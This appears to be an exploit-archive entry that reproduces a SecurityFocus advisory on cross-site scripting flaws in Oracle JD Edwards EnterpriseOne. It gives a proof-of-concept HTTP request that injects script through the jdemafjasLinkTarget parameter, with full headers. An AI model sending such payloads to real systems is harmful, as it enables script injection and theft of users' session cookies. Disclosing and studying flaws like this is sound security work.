@@ -1,0 +1,33 @@
+source: http://www.securityfocus.com/bid/47479/info
+    
+Oracle JD Edwards EnterpriseOne is prone to multiple cross-site scripting vulnerabilities.
+    
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+    
+This vulnerability affects the following supported versions:
+8.9 GA through 8.98.4.1 and OneWorld Tools through 24.1.3 
+
+* http://XXX.XXX.XXX.XXX/jde/JASMafletMafBrowserClose.mafService
+
+Parameter: jdemafjasLinkTarget
+
+
+
+* The GET request has been set to: E1MENUMAIN_3860308878877903872"%2Balert%28222735%29%2B"
+
+
+
+/jde/JASMafletMafBrowserClose.mafService?jdemafjasFrom=BrowserClose&e1.mode=view&jdeLoginAction=LOGOUT&e1.state=maximized&jdemafjasLinkTarget=E1MENUMAIN_3860308878877903872"%2Balert%28222735%29%2B"&RENDER_MAFLET=E1Menu&jdemafjasLauncher=PSFT_TE_V3_SW&e1.service=JASMafletMafBrowserClose&e1.namespace=
+HTTP/1.0
+
+Cookie: e1AppState=0:|; advancedState=none; JSESSIONID=00003wyVho0_-Ma0fQp67cuqdCs:14p7ulc8o; e1MenuState=100003759|
+
+Accept: */*
+
+Accept-Language: en-US
+
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
+
+Host: XXX.XXX.XXX.XXX
+
+Referer: http://XXX.XXX.XXX.XXX/jde/E1Menu.maf?selectJPD812=*ALL&envRadioGroup=&jdeowpBackButtonProtect=PROTECTED
